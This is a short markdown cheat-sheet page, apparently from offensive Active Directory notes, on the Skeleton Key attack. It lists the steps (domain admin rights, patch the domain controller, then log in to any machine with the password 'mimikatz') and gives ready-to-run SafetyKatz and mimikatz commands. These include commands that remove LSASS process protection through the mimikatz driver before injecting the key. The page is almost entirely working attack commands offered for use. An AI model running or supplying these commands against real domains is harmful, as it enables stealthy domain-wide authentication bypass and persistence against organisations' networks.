> ⚠️ **WARNING:**
> NEVER USE ON PRODUCTION!
> 
> Resets on domain controller reboot.

# Methodology
>1. Have domain admin privileges.
>2. Patch the domain controller.
>3. Use the password `mimikatz` to access any machine with a valid username.

---

# Binaries
>**ℹ️ Info:**
>
> Remember to follow the [binaries methodology](../00%20-%20Miscellaneous/01-%20Methodology.md#Binaries).

## SafetyKatz
**Inject a skeleton key on a domain controller:**
```cmd
SafetyKatz.exe '"privilege::debug" "misc::skeleton"' -ComputerName us-dc
```

**If LSASS is running as a protected service, we can still use Skeleton Key but it needs the mimikatz driver ([mimidriv.sys](https://github.com/ParrotSec/mimikatz/blob/master/x64/mimidrv.sys)) on disk of the target DC:**
```cmd
privilege::debug
!+
!processprotect /process:lsass.exe /remove
misc::skeleton
!-
```